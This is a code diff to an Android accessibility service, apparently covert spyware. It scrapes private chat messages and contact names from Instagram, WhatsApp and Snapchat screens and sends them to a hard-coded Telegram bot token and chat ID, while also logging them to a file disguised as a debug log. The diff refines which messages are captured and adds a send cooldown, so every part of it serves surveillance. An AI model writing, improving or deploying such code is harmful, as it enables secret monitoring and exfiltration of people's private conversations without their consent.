@@ -26,10 +26,34 @@ public class GlobalActionBarService extends AccessibilityService {
     private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
     private static final String CHAT_ID = "5465116744";
 
-    // Cache to avoid sending the same data repeatedly
+    // Cooldown: only send once every 5 seconds
+    private long lastSendTime = 0;
     private String lastSentHash = "";
 
-    // Blacklist of UI junk to ignore
+    // Message view IDs (Instagram, WhatsApp, Snapchat)
+    private Set<String> messageViewIds = new HashSet<String>() {{
+        // Instagram
+        add("com.instagram.android:id/row_message_text");
+        add("com.instagram.android:id/comment_text");
+        add("com.instagram.android:id/direct_message_text");
+        add("com.instagram.android:id/message_text");
+        // WhatsApp
+        add("com.whatsapp:id/message_text");
+        // Snapchat
+        add("com.snapchat.android:id/chat_message_text");
+    }};
+
+    // Sender name view IDs
+    private Set<String> senderViewIds = new HashSet<String>() {{
+        add("com.instagram.android:id/row_user_name");
+        add("com.instagram.android:id/comment_user_name");
+        add("com.instagram.android:id/username_text_view");
+        add("com.instagram.android:id/direct_message_recipient_name");
+        add("com.whatsapp:id/contact_name");
+        add("com.snapchat.android:id/chat_name");
+    }};
+
+    // Blacklist of strings to ignore completely
     private Set<String> uiJunk = new HashSet<String>() {{
         add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
         add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
@@ -45,24 +69,15 @@ public class GlobalActionBarService extends AccessibilityService {
         add("Seen by"); add("Delivered to"); add("Read by");
         add("Message"); add("Chat"); add("Group"); add("Broadcast");
         add("View Profile"); add("View Story"); add("Reply to");
-    }};
-
-    // View IDs that are likely part of message bubbles
-    private Set<String> messageViewIds = new HashSet<String>() {{
-        // Instagram
-        add("message_text");
-        add("row_message_text");
-        add("comment_text");
-        add("text");
-        add("message");
-        // WhatsApp
-        add("message_text");
-        add("conversation_row_text");
-        add("status_message");
-        // Snapchat
-        add("chat_message_text");
-        add("message_bubble");
-        add("snap_text");
+        add("Manage"); add("Clear all"); add("Location off");
+        add("Self Aware"); add("Inspo needed...");
+        add("GB"); add("MB"); add("used"); add("airtel"); add("Screenlogger");
+        add("Telegram"); add("Search or ask Meta AI");
+        add("The Wild Theme"); add("Janam Janam"); add("Sai Abhyankkar");
+        add("Dhanush"); add("Pritam"); add("Arijit Singh"); add("Antara Mitra");
+        add("Aber sie"); add("Requests"); add("BHAI LOG 💓🫂");
+        add("Bakchodi boiz"); add("MARK AS READ");
+        add("Display brightness");
     }};
 
     @Override
@@ -84,302 +99,142 @@ public class GlobalActionBarService extends AccessibilityService {
             return;
         }
 
-        // Only scrape when screen content changes (new message or scroll)
+        // Only on window state change (new chat opened) or content change (new message)
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
 
             AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root != null) {
-                // Extract structured chat data
-                ChatData chatData = extractChatData(root, pkg);
-                if (chatData != null && !chatData.messages.isEmpty()) {
-                    // Build a clean, structured output
-                    StringBuilder logBuilder = new StringBuilder();
-                    logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
-                    if (chatData.contactName != null && !chatData.contactName.isEmpty()) {
-                        logBuilder.append("👤 Chat with: ").append(chatData.contactName).append("\n");
-                    }
-                    logBuilder.append("─────────────────────\n");
-                    for (Message msg : chatData.messages) {
-                        logBuilder.append("  ").append(msg.sender).append(": ").append(msg.text).append("\n");
-                    }
+            if (root == null) return;
 
-                    String fullLog = logBuilder.toString().trim();
-                    // Generate a hash of the full log to detect duplicates
-                    String hash = Integer.toHexString(fullLog.hashCode());
-                    if (!hash.equals(lastSentHash)) {
-                        lastSentHash = hash;
-                        sendToTelegram(fullLog);
-                        writeToFile(fullLog);
-                    }
+            // 1. Get contact name (only from sender view IDs)
+            String contactName = findContactName(root);
+
+            // 2. Get all message texts from known message view IDs
+            List<String> messageTexts = extractMessageTexts(root);
+
+            // 3. Clean and deduplicate
+            Set<String> uniqueMessages = new HashSet<>();
+            for (String msg : messageTexts) {
+                String cleaned = cleanMessage(msg);
+                if (!cleaned.isEmpty()) {
+                    uniqueMessages.add(cleaned);
                 }
             }
+
+            // 4. Build output
+            if (uniqueMessages.isEmpty()) return; // no real messages
+
+            StringBuilder logBuilder = new StringBuilder();
+            logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
+            if (contactName != null && !contactName.isEmpty()) {
+                logBuilder.append("👤 Chat with: ").append(contactName).append("\n");
+            }
+            logBuilder.append("─────────────────────\n");
+            for (String msg : uniqueMessages) {
+                // Try to split sender:message if ":" exists
+                if (msg.contains(":")) {
+                    String[] parts = msg.split(":", 2);
+                    if (parts.length == 2 && parts[0].trim().length() < 30) {
+                        logBuilder.append("  ").append(parts[0].trim()).append(": ").append(parts[1].trim()).append("\n");
+                        continue;
+                    }
+                }
+                logBuilder.append("  Message: ").append(msg).append("\n");
+            }
+
+            String fullLog = logBuilder.toString().trim();
+            if (fullLog.length() < 30) return; // too short, likely no meaningful content
+
+            // Cooldown + hash check
+            String hash = Integer.toHexString(fullLog.hashCode());
+            long now = System.currentTimeMillis();
+            if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
+                // Same content or too soon – skip
+                return;
+            }
+
+            // Update state and send
+            lastSentHash = hash;
+            lastSendTime = now;
+            sendToTelegram(fullLog);
+            writeToFile(fullLog);
         }
     }
 
-    /**
-     * Represents a single message with sender and text
-     */
-    private static class Message {
-        String sender;
-        String text;
-        Message(String sender, String text) {
-            this.sender = sender;
-            this.text = text;
-        }
-    }
-
-    /**
-     * Represents the full chat data (contact name + list of messages)
-     */
-    private static class ChatData {
-        String contactName;
-        List<Message> messages = new ArrayList<>();
-    }
-
-    private ChatData extractChatData(AccessibilityNodeInfo root, String pkg) {
-        ChatData chatData = new ChatData();
-
-        // Try to find contact name
-        String contactName = findContactName(root, pkg);
-        chatData.contactName = contactName;
-
-        // Find message bubbles and extract text + sender
-        List<Message> messages = extractMessagesFromBubbles(root, pkg);
-        chatData.messages = messages;
-
-        return chatData;
-    }
-
-    private String findContactName(AccessibilityNodeInfo root, String pkg) {
-        // Search for nodes that typically contain the contact name
-        String[] nameViewIds = {
-            "com.instagram.android:id/row_user_name",
-            "com.instagram.android:id/comment_user_name",
-            "com.instagram.android:id/username_text_view",
-            "com.whatsapp:id/contact_name",
-            "com.whatsapp:id/conversation_contact_name",
-            "com.snapchat.android:id/chat_name",
-            "com.snapchat.android:id/contact_name"
-        };
-
-        for (String viewId : nameViewIds) {
-            String found = findTextByViewId(root, viewId);
-            if (found != null && !found.isEmpty()) {
-                return found;
+    private String findContactName(AccessibilityNodeInfo root) {
+        for (String id : senderViewIds) {
+            String name = findTextByViewId(root, id);
+            if (name != null && !name.isEmpty()) {
+                return name;
             }
         }
-
-        // Fallback: look for any large text at the top of the screen (likely a name)
-        return findLargeText(root);
+        return null;
     }
 
-    private String findTextByViewId(AccessibilityNodeInfo node, String targetViewId) {
+    private String findTextByViewId(AccessibilityNodeInfo node, String targetId) {
         if (node == null) return null;
-        if (node.getViewIdResourceName() != null) {
-            String viewId = node.getViewIdResourceName();
-            if (viewId.equals(targetViewId) && node.getText() != null) {
-                return node.getText().toString();
+        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
+            if (node.getText() != null) {
+                String text = node.getText().toString().trim();
+                if (!text.isEmpty()) return text;
             }
         }
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo child = node.getChild(i);
             if (child != null) {
-                String result = findTextByViewId(child, targetViewId);
+                String result = findTextByViewId(child, targetId);
                 if (result != null) return result;
             }
         }
         return null;
     }
 
-    private String findLargeText(AccessibilityNodeInfo root) {
-        // Look for text that is likely a name (not a message)
-        List<String> candidates = new ArrayList<>();
-        collectLargeText(root, candidates, 0);
-        if (candidates.isEmpty()) return null;
-        // Pick the shortest candidate (often the name is displayed prominently)
-        String best = candidates.get(0);
-        for (String c : candidates) {
-            if (c.length() < best.length()) best = c;
+    private List<String> extractMessageTexts(AccessibilityNodeInfo root) {
+        List<String> messages = new ArrayList<>();
+        for (String id : messageViewIds) {
+            List<String> found = findAllTextByViewId(root, id);
+            messages.addAll(found);
         }
-        return best;
-    }
-
-    private void collectLargeText(AccessibilityNodeInfo node, List<String> list, int depth) {
-        if (node == null) return;
-        if (node.getText() != null) {
-            String text = node.getText().toString().trim();
-            // Names are usually not too long (2-20 characters) and don't contain common message patterns
-            if (text.length() > 1 && text.length() < 25 && !uiJunk.contains(text) && !containsJunk(text) && !containsTimestamp(text)) {
-                list.add(text);
-            }
-        }
-        for (int i = 0; i < node.getChildCount(); i++) {
-            AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) collectLargeText(child, list, depth + 1);
-        }
-    }
-
-    private List<Message> extractMessagesFromBubbles(AccessibilityNodeInfo root, String pkg) {
-        List<Message> messages = new ArrayList<>();
-
-        // Find all message bubbles
-        List<AccessibilityNodeInfo> bubbles = findMessageBubbles(root, pkg);
-
-        for (AccessibilityNodeInfo bubble : bubbles) {
-            // Extract message text
-            String msgText = extractMessageText(bubble);
-            if (msgText == null || msgText.isEmpty()) continue;
-
-            // Try to identify sender
-            String sender = "Unknown";
-            if (pkg.equals("com.instagram.android") || pkg.equals("com.whatsapp")) {
-                // Look for sender name in the bubble
-                String name = findSenderNameInBubble(bubble);
-                if (name != null) sender = name;
-            }
-
-            // Clean the message text
-            msgText = cleanMessage(msgText);
-            if (msgText.isEmpty()) continue;
-
-            // Add to list
-            messages.add(new Message(sender, msgText));
-        }
-
         return messages;
     }
 
-    private List<AccessibilityNodeInfo> findMessageBubbles(AccessibilityNodeInfo root, String pkg) {
-        List<AccessibilityNodeInfo> bubbles = new ArrayList<>();
-        traverseForBubbles(root, bubbles, pkg);
-        return bubbles;
-    }
-
-    private void traverseForBubbles(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list, String pkg) {
-        if (node == null) return;
-
-        // Check if this node is a message bubble
-        if (isMessageBubble(node, pkg)) {
-            list.add(node);
-            return; // Don't go deeper into this bubble to avoid duplicate text
-        }
-
-        for (int i = 0; i < node.getChildCount(); i++) {
-            AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) traverseForBubbles(child, list, pkg);
-        }
-    }
-
-    private boolean isMessageBubble(AccessibilityNodeInfo node, String pkg) {
-        if (node == null) return false;
-
-        String viewId = node.getViewIdResourceName();
-        if (viewId != null) {
-            // WhatsApp bubbles
-            if (viewId.contains("message_row")) return true;
-            if (viewId.contains("bubble")) return true;
-            // Instagram bubbles
-            if (viewId.contains("row_message")) return true;
-            if (viewId.contains("comment_row")) return true;
-            // Snapchat bubbles
-            if (viewId.contains("chat_bubble")) return true;
-            if (viewId.contains("message_bubble")) return true;
-
-            // Check if viewId ends with common message identifiers
-            for (String id : messageViewIds) {
-                if (viewId.endsWith(id)) return true;
-            }
-        }
-
-        // Heuristic: if this node has text and is inside a list, and has a specific depth
-        // We'll also check if it has a child with a name
-        return false;
-    }
-
-    private String extractMessageText(AccessibilityNodeInfo bubble) {
-        // Try to find text in the bubble, prioritizing specific view IDs
-        String[] messageTextIds = {
-            "text",
-            "message_text",
-            "row_message_text",
-            "comment_text",
-            "bubble_text",
-            "status_message"
-        };
-
-        for (String id : messageTextIds) {
-            String text = findTextByViewId(bubble, id);
-            if (text != null && !text.isEmpty()) {
-                return text;
-            }
-        }
-
-        // If not found, collect all text in the bubble and concatenate
-        StringBuilder sb = new StringBuilder();
-        collectAllTexts(bubble, sb);
-        return sb.toString();
-    }
-
-    private String findSenderNameInBubble(AccessibilityNodeInfo bubble) {
-        // Look for sender name within this bubble's children
-        String[] nameIds = {
-            "row_user_name",
-            "comment_user_name",
-            "username_text_view",
-            "from_name",
-            "sender_name"
-        };
-
-        for (String id : nameIds) {
-            String name = findTextByViewId(bubble, id);
-            if (name != null && !name.isEmpty()) {
-                return name;
-            }
-        }
-
-        // If the bubble is a WhatsApp message from the other person, the name might be in a sibling
-        // We'll check if the bubble has a child with "from" in its ID
-        return null;
-    }
-
-    private void collectAllTexts(AccessibilityNodeInfo node, StringBuilder sb) {
-        if (node == null) return;
-        if (node.getText() != null) {
-            String text = node.getText().toString();
-            if (!text.isEmpty()) {
-                if (sb.length() > 0) sb.append(" ");
-                sb.append(text);
+    private List<String> findAllTextByViewId(AccessibilityNodeInfo node, String targetId) {
+        List<String> results = new ArrayList<>();
+        if (node == null) return results;
+        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
+            if (node.getText() != null) {
+                String text = node.getText().toString().trim();
+                if (!text.isEmpty()) results.add(text);
             }
         }
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) collectAllTexts(child, sb);
+            if (child != null) {
+                results.addAll(findAllTextByViewId(child, targetId));
+            }
         }
+        return results;
     }
 
     private String cleanMessage(String msg) {
-        // Remove common garbage
-        msg = msg.replaceAll("\\s+", " ").trim();
-        // If the message is just "Seen" or "Delivered", ignore it
-        if (uiJunk.contains(msg)) return "";
-        if (msg.matches(".*\\d{1,2}:\\d{2}.*")) return ""; // timestamp
-        if (msg.matches(".*(AM|PM).*")) return "";
-        return msg;
-    }
-
-    private boolean containsJunk(String text) {
+        msg = msg.trim();
+        // Reject if contains any junk substring (case-insensitive)
         for (String junk : uiJunk) {
-            if (text.contains(junk)) return true;
+            if (msg.toLowerCase().contains(junk.toLowerCase())) {
+                return "";
+            }
         }
-        return false;
-    }
-
-    private boolean containsTimestamp(String text) {
-        return text.matches(".*\\d{1,2}:\\d{2}.*") ||
-               text.matches(".*\\d{1,2}[mh] .*") ||
-               text.matches(".*(AM|PM).*") ||
-               text.matches(".*\\d+\\s*(sec|min|hour).*");
+        // Remove timestamps like "12:30", "12:30 PM", "2m", "1h"
+        if (msg.matches(".*\\d{1,2}:\\d{2}.*")) return "";
+        if (msg.matches(".*(AM|PM).*")) return "";
+        if (msg.matches(".*\\d+[mh] .*")) return "";
+        // Must contain at least one alphabetic character
+        if (!msg.matches(".*[a-zA-Z].*")) return "";
+        // Too short (likely UI label)
+        if (msg.length() < 3) return "";
+        // If all uppercase and short, likely UI
+        if (msg.equals(msg.toUpperCase()) && msg.length() < 8) return "";
+        return msg;
     }
 
     private String getAppName(String pkg) {
@@ -391,28 +246,24 @@ public class GlobalActionBarService extends AccessibilityService {
 
     // ---------- Telegram Sender ----------
     private void sendToTelegram(final String message) {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
-                            "/sendMessage?chat_id=" + CHAT_ID +
-                            "&text=" + URLEncoder.encode(message, "UTF-8");
-                    URL url = new URL(urlString);
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("GET");
-                    conn.setConnectTimeout(5000);
-                    conn.setReadTimeout(5000);
-                    int responseCode = conn.getResponseCode();
-                    conn.disconnect();
-                } catch (Exception e) {
-                    writeToFile("Telegram error: " + e.toString());
-                }
+        new Thread(() -> {
+            try {
+                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
+                        "/sendMessage?chat_id=" + CHAT_ID +
+                        "&text=" + URLEncoder.encode(message, "UTF-8");
+                URL url = new URL(urlString);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+                int responseCode = conn.getResponseCode();
+                conn.disconnect();
+            } catch (Exception e) {
+                writeToFile("Telegram error: " + e.toString());
             }
         }).start();
     }
 
-    // ---------- Local Logging ----------
     private void writeToFile(String text) {
         try {
             File logFile = new File(getFilesDir(), "debug_log.txt");
